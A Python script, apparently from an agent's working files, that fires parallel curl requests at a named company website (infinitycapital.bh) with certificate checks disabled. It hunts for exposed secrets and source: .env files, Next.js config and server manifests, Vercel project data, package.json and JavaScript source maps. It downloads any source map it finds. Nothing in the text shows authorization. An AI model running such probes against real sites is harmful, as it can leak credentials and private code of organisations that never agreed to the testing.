import subprocess, concurrent.futures, os

BASE = "https://www.infinitycapital.bh"
os.makedirs("tool_outputs/maps", exist_ok=True)
chunks = os.listdir("tool_outputs/chunks")
cands = []
for c in chunks:
    cands.append(f"/_next/static/chunks/{c}.map")
# other next internals
cands += [
    "/_next/static/chunks/webpack-e401313d27ef7f61.js.map",
    "/next.config.js", "/.env", "/.env.local", "/.env.production",
    "/_next/routes-manifest.json", "/_next/server/pages-manifest.json",
    "/_next/server/app-paths-manifest.json",
    "/api/send/route.js", "/.vercel/project.json",
    "/package.json", "/_next/data/index.json",
    "/sitemap.xml", "/.well-known/security.txt", "/_next/image",
    "/api/send?__nextDataReq=1",
]

def probe(c):
    p = subprocess.run(["curl","-sk","--max-time","20","-o","/tmp/pr","-w","%{http_code}|%{size_download}|%{content_type}",BASE+c],
                       capture_output=True, text=True)
    head = ""
    try: head = open("/tmp/pr","rb").read()[:80]
    except Exception: pass
    return c, p.stdout, head

with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
    for c, meta, head in ex.map(probe, sorted(set(cands))):
        code = meta.split("|")[0]
        flag = "  <<<<" if code == "200" and "json" in meta and c.endswith(".map") else ""
        print(f"{meta:45s} {c}  {head[:60]!r}{flag}")
        if code == "200" and c.endswith(".map"):
            subprocess.run(["curl","-sk","--max-time","30","-o","tool_outputs/maps/"+c.split('/')[-1], BASE+c])
